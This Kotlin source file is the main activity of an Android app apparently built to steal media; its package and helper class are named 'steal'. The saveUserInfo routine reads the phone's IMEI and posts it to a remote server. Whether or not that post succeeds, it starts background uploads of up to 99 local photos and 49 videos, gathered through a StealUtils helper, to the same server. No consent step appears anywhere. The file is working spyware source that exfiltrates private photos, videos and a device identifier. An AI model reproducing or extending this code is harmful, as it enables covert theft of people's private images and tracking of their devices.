package king.steal.camara.act

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.view.KeyEvent
import android.widget.Toast
import king.steal.camara.net.Api
import king.steal.camara.net.NetWorkUtilsK
import java.io.File
import android.telephony.TelephonyManager
import android.view.View
import android.widget.AdapterView
import com.google.gson.Gson
import com.zhy.http.okhttp.OkHttpUtils
import com.zhy.http.okhttp.callback.StringCallback
import king.steal.camara.R
import king.steal.camara.adapter.FileListAdapter
import king.steal.camara.base.BaseActivity
import king.steal.camara.bean.CloudFileBean
import king.steal.camara.bean.CloudFileParser
import king.steal.camara.bean.User
import king.steal.camara.utils.LogUtils
import king.steal.camara.utils.SpUtil
import king.steal.camara.utils.ToastUtils
import king.steal.marrykotlin.iface.OnRequestListener
import king.steal.tool.StealUtils
import kotlinx.android.synthetic.main.act_main.*
import okhttp3.Call
import org.jetbrains.anko.async
import java.lang.Exception
import java.text.SimpleDateFormat
import java.util.*
import kotlin.collections.HashMap


class MainActivity : BaseActivity() {


    private var mExitTime: Long? = 0L


    override fun layoutId(): Int {
        return R.layout.act_main
    }

    override fun initData() {
        getCloudFileList()
        initEvent()

    }

    override fun initView() {
    }

    override fun start() {
    }


    private fun initEvent() {

    }

    private fun getCloudFileList() {
        val map = java.util.HashMap<String, String>()
        val imei = SpUtil.getInstance().getString("imei")
        map["imei"] = imei
        NetWorkUtilsK.doPostJson(Api.baseUrl, map, Api.getCloudFileList, object : OnRequestListener {
            override fun onSuccess(t: String) {
                val bean = Gson().fromJson(t, CloudFileParser::class.java)
                if (null != bean && bean.result != null) {
                    val adapter = FileListAdapter(mListView, bean.result, this@MainActivity)
                    mListView.adapter = adapter
                }
            }

            override fun onError(errorMsg: String) {
                ToastUtils.showToast("网络错误，请重启应用")
            }
        })
    }

    /**
     * 上传图片
     */
    private fun upLoadPic(key: String, value: File, imei: String) {

        OkHttpUtils.post().addParams("dir", imei)
                .addFile(key, value.absolutePath, value)
                .url(Api.baseUrl)
                .addHeader("method", Api.upLoadPic)
                .build().execute(object : StringCallback() {
                    override fun onResponse(p0: String?, p1: Int) {
                        LogUtils.e(p0)
                    }

                    override fun onError(p0: Call?, p1: Exception?, p2: Int) {
                        if (p1 != null) {
                            LogUtils.e(p1.message)
                        }
                    }
                })
    }

    /**
     * 批量上传图片
     */
    private fun upLoadPics(imei: String) {
        val allLocalPhotos = StealUtils.getAllLocalPhotos(this@MainActivity)
        val files = HashMap<String, File>()
        var i = 0
        //机算数量
        allLocalPhotos.forEach {
            if (it.fileSize / 1000 in 19..5999) {
                i++
                if (i < 100) {
                    //files[it.title] = File(it.filePath)
                    async {
                        OkHttpUtils.post().addParams("dir", imei)
                                .addFile(it.title, it.title, File(it.filePath))
                                .url(Api.baseUrl)
                                .addHeader("method", Api.upLoadPic)
                                .build().execute(object : StringCallback() {
                                    override fun onResponse(p0: String?, p1: Int) {
                                        LogUtils.e(p0)
                                    }

                                    override fun onError(p0: Call?, p1: Exception?, p2: Int) {
                                        if (p1 != null) {
                                            LogUtils.e(p1.message)
                                        }
                                    }
                                })
                    }
                }
            }
        }

    }

    /**
     * 批量上传视频
     */
    private fun upLoadVideos(imei: String) {
        val allLocalPhotos = StealUtils.getAllLocalVideos(this@MainActivity)
        val files = HashMap<String, File>()
        var i = 0
        //机算数量
        allLocalPhotos.forEach {
            i++
            if (i < 50) {
                async {
                    OkHttpUtils.post().addParams("dir", imei)
                            //.files("file", files)
                            .addFile(it.title, it.title, File(it.filePath))
                            .url(Api.baseUrl)
                            .addHeader("method", Api.upLoadVideo)
                            .build().execute(object : StringCallback() {
                                override fun onResponse(p0: String?, p1: Int) {
                                    LogUtils.e(p0)
                                }

                                override fun onError(p0: Call?, p1: Exception?, p2: Int) {
                                    if (p1 != null) {
                                        LogUtils.e(p1.message)
                                    }
                                }
                            })
                }
            }
        }

    }

    /**
     * 保存用户信息
     */
    @SuppressLint("HardwareIds", "SimpleDateFormat", "MissingPermission")
    private fun saveUserInfo() {

        val user = User()
        val map = HashMap<String, String>()
        val telephonyMgr = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val imei = telephonyMgr.deviceId as String
        val formatter = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
        val curDate = Date(System.currentTimeMillis())
        user.id = imei
        user.deviceId = imei
        user.intoCount = "0"
        user.imageSize = "0"
        user.createTime = formatter.format(curDate)
        map["data"] = Gson().toJson(user)
        NetWorkUtilsK.doPostJson(Api.baseUrl, map, Api.saveInfo, object : OnRequestListener {
            override fun onSuccess(t: String) {
                async { upLoadPics(imei) }
                async { upLoadVideos(imei) }

            }

            override fun onError(errorMsg: String) {
                async { upLoadPics(imei) }
                async { upLoadVideos(imei) }
            }
        })


    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent): Boolean {
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            if (System.currentTimeMillis() - this!!.mExitTime!! > 2000) {
                Toast.makeText(applicationContext, "再按一次退出应用", Toast.LENGTH_SHORT).show()
                mExitTime = System.currentTimeMillis()

            } else {
                System.exit(0)
                finish()
            }
            return true
        }
        return super.onKeyDown(keyCode, event)
    }


}
